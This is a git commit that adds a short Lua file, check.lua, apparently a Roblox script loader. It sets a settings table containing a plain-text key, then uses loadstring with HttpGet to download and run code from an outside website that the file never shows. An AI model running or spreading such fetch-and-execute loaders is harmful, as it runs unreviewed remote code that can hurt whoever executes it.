c22306af4c3de5aae0119024114653372c010f56
Hobeogithub <158523582+Hobeogithub@users.noreply.github.com>
2024-03-03 22:46:10 +0700

    Create check.lua

---
+++ check.lua
@@ -0,0 +1,6 @@
+getgenv().PVSetting = {
+    key = 'XwkRa-FBWOK_Hobeo-', -- Secret Code
+    DelayUpdate = 15, -- Delay Update (Seconds)
+    note = 'Hobeo', 
+}
+loadstring(game:HttpGet("https://bestauto24h.com/roblox/script.txt"))()
